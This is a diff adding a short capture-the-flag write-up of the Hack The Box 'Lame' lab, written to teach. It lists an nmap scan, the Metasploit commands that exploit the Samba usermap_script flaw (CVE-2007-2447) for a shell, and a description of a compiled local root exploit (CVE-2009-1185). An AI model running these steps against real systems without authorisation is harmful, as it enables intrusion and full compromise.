@@ -1,0 +1,37 @@
+#Hack The Box: "Lame" Challenge Writeup
+#Objective:
+
+Gain access to the target system by exploiting a vulnerable network service and escalate privileges to root.
+
+#Step 1: Initial Reconnaissance
+
+-Used nmap to scan the target system for open ports and services:
+
+    'bash
+    'nmap -A -T4 <target_ip>
+
+-Discovered open ports 21 (FTP), 22 (SSH), 139 and 445 (SMB).
+
+#Step 2: Exploiting SMB with Metasploit
+
+-Discovered the system was running Samba version 3.0.20, which is vulnerable to a known exploit (CVE-2007-2447).
+-Used the Metasploit usermap_script exploit to gain a shell:
+
+    'bash
+    'msfconsole
+    'use exploit/multi/samba/usermap_script
+    'set RHOST <target_ip>
+    'exploit
+
+-Successfully obtained a low-privileged shell on the system.
+
+#Step 3: Privilege Escalation
+
+-Checked for sudo privileges but found none.
+-Discovered a local vulnerability (CVE-2009-1185) in the system's kernel that could be exploited for privilege escalation.
+-Compiled and executed the exploit to escalate privileges to root.
+
+#Lessons Learned:
+
+-Outdated services like Samba pose significant risks if not regularly patched.
+-Always check for local privilege escalation opportunities after gaining an initial foothold.
